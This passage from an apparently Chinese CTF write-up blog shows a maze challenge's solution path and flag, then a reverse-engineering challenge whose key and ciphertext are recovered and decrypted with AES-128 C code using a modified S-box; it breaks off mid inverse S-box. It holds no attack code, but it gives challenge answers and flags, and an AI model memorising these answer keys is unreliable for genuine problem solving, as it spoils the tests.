class="line">##*#Y*##*#</span><br><span class="line">#**#**#**#</span><br><span class="line">#*###*####</span><br><span class="line">#*###*####</span><br><span class="line">#*S****###</span><br><span class="line">#*########</span><br><span class="line">##**#*##*#</span><br><span class="line">###**#***#</span><br><span class="line">##########</span><br></pre></td></tr></table></figure><p>第一轮（chance=0），从S到Y路径：STTAAARRRR</p><p>第二轮（chance=1），从S到Y路径：AAATTTTS</p><p>连起来，加flag壳，得到：<code>SYC&#123;STTAAARRRRAAATTTTS&#125;</code>。</p><p>​    </p><h3 id="AES"><a href="#AES" class="headerlink" title="AES!"></a>AES!</h3><blockquote><p>Am1re说AES一学一个不吱声</p></blockquote><p>提取出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key = b&#x27;SYCLOVERSYCLOVER&#x27;</span><br><span class="line">c = [0x99, 0xE8, 0xB8, 0x01, 0xC8, 0x82, 0x51, 0x93, 0x12, 0xEE, </span><br><span class="line">  0x89, 0x64, 0xE7, 0xEF, 0x63, 0x8D, 0x51, 0xDF, 0x5D, 0x78, </span><br><span class="line">  0x39, 0xAA, 0x39, 0x62, 0xA0, 0xB4, 0x50, 0x30, 0x47, 0x30, </span><br><span class="line">  0x21, 0x06]</span><br></pre></td></tr></table></figure><p>更改了AES的S盒，拿AES源码修改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> eK[<span class="number">44</span>], dK[<span class="number">44</span>];    <span class="comment">// encKey, decKey</span></span><br><span class="line">    <span class="type">int</span> Nr; <span class="comment">// 10 rounds</span></span><br><span class="line">&#125;AesKey;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLOCKSIZE 16  <span class="comment">//AES-128分组长度为16字节</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uint8_t y[4] -&gt; uint32_t x</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOAD32H(x, y) \</span></span><br><span class="line"><span class="meta">  do &#123; (x) = ((uint32_t)((y)[0] &amp; 0xff)&lt;&lt;24) | ((uint32_t)((y)[1] &amp; 0xff)&lt;&lt;16) | \</span></span><br><span class="line"><span class="meta">             ((uint32_t)((y)[2] &amp; 0xff)&lt;&lt;8)  | ((uint32_t)((y)[3] &amp; 0xff));&#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uint32_t x -&gt; uint8_t y[4]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STORE32H(x, y) \</span></span><br><span class="line"><span class="meta">  do &#123; (y)[0] = (uint8_t)(((x)&gt;&gt;24) &amp; 0xff); (y)[1] = (uint8_t)(((x)&gt;&gt;16) &amp; 0xff);   \</span></span><br><span class="line"><span class="meta">       (y)[2] = (uint8_t)(((x)&gt;&gt;8) &amp; 0xff); (y)[3] = (uint8_t)((x) &amp; 0xff); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从uint32_t x中提取从低位开始的第n个字节</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BYTE(x, n) (((x) &gt;&gt; (8 * (n))) &amp; 0xff)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* used for keyExpansion */</span></span><br><span class="line"><span class="comment">// 字节替换然后循环左移1位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \</span></span><br><span class="line"><span class="meta">                ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uint32_t x循环左移n位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROF32(x, n)  (((x) <span class="string">&lt;&lt; (n)) | ((x) &gt;</span>&gt; (32-(n))))</span></span><br><span class="line"><span class="comment">// uint32_t x循环右移n位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROR32(x, n)  (((x) &gt;&gt; (n)) | ((x) &lt;&lt; (32-(n))))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* for 128-bit blocks, Rijndael never uses more than 10 rcon values */</span></span><br><span class="line"><span class="comment">// AES-128轮常量</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> rcon[<span class="number">10</span>] = &#123;</span><br><span class="line">        <span class="number">0x01000000</span>UL, <span class="number">0x02000000</span>UL, <span class="number">0x04000000</span>UL, <span class="number">0x08000000</span>UL, <span class="number">0x10000000</span>UL,</span><br><span class="line">        <span class="number">0x20000000</span>UL, <span class="number">0x40000000</span>UL, <span class="number">0x80000000</span>UL, <span class="number">0x1B000000</span>UL, <span class="number">0x36000000</span>UL</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// S盒</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">unsigned char S[256] = &#123;</span></span><br><span class="line"><span class="comment">        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,</span></span><br><span class="line"><span class="comment">        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,</span></span><br><span class="line"><span class="comment">        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,</span></span><br><span class="line"><span class="comment">        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,</span></span><br><span class="line"><span class="comment">        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,</span></span><br><span class="line"><span class="comment">        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,</span></span><br><span class="line"><span class="comment">        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,</span></span><br><span class="line"><span class="comment">        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,</span></span><br><span class="line"><span class="comment">        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,</span></span><br><span class="line"><span class="comment">        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,</span></span><br><span class="line"><span class="comment">        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,</span></span><br><span class="line"><span class="comment">        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,</span></span><br><span class="line"><span class="comment">        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,</span></span><br><span class="line"><span class="comment">        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,</span></span><br><span class="line"><span class="comment">        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,</span></span><br><span class="line"><span class="comment">        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16</span></span><br><span class="line"><span class="comment">&#125;;*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>] = &#123;<span class="number">0x7C</span>, <span class="number">0xCA</span>, <span class="number">0x7B</span>, <span class="number">0x77</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0x47</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0x63</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>,</span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>,</span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>,</span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,</span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>,</span><br><span class="line">  <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line">  <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>,</span><br><span class="line">  <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>,</span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>,</span><br><span class="line">  <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0x97</span>, <span class="number">0xCD</span>,</span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>,</span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>,</span><br><span class="line">  <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>,</span><br><span class="line">  <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>,</span><br><span class="line">  <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>,</span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>,</span><br><span class="line">  <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>,</span><br><span class="line">  <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>,</span><br><span class="line">  <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>, <span class="number">0x8C</span>,</span><br><span class="line">  <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>,</span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>, <span class="number">0x87</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//逆S盒</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> inv_S[<span class="number">256</span>] = &#123;</span><br><span class="line">        <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x38</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>, <span class="number">0xA3</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0xD7</span>, <span class="number">0xFB</span>,</span><br><span class="line">        <span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xDE</span>, <span class="number">0xE9</span>, <span class="number">0xCB</span>,</span><br><span class="line">        <span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x3D</span>, <span class="number">0xEE</span>, <span class="number">0x4C</span>, <span class="number">0x95</span>, <span class="number">0x0B</span>, <span class="number">0x42</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x4E</span>,</span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x2E</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xD9</span>, <span class="number">0x24</span>, <span class="number">0xB2</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0xA2</span>, <span class="number">0x49</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0xD1</span>, <span class="number">0x25</span>,</span><br><span class="line">        <span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xF6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xD4</span>, <span class="number">0xA4</span>, <span class="number">0x5C</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>,</span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xFD</span>, <span class="number">0xED</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0x5E</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>,</span><br><span 